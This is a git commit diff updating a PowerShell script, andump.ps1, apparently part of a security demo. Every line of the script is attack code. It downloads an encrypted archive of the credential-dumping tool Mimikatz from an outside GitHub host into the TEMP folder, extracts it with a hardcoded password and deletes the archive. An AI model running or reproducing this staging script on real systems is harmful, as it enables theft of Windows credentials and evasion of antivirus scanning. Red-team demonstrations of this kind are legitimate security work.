c535cabcc9a2239003b7e19ca8f60c8b392784ae
crjptpp <119838914+crjptpp@users.noreply.github.com>
2022-12-06 17:42:14 +0900

    Update andump.ps1

--- sedemo01/andump.ps1
+++ sedemo01/andump.ps1
@@ -1,4 +1,4 @@
-Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81648140" -Headers $headers -OutFile $env:TEMP\enc_mimikatz.zip
+Invoke-WebRequest "https://github.com/crjptpp/tools_public/raw/main/enc_mimikatz.zip" -OutFile $env:TEMP\enc_mimikatz.zip
 cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\enc_mimikatz.zip'
 Remove-Item $env:TEMP\enc_mimikatz.zip
 cd $env:TEMP
